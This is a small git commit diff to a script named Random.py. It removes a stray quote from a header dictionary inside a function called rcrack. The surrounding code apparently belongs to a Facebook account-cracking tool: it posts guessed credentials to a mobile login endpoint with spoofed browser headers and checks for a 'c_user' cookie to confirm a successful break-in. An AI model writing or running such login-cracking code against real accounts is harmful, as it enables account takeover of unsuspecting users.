3e13512a24bf6d037e186508efbcd4efc9db1c6c
shipukhan2001 <149859698+shipukhan2001@users.noreply.github.com>
2024-01-09 01:27:57 +0600

    Update Random.py

--- Random.py
+++ Random.py
@@ -477,7 +477,7 @@ def rcrack(uid,pwx,tl):
     'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1',
     'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
-    'viewport-width': '980',''}
+    'viewport-width': '980',}
             lo = session.post('https://p.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
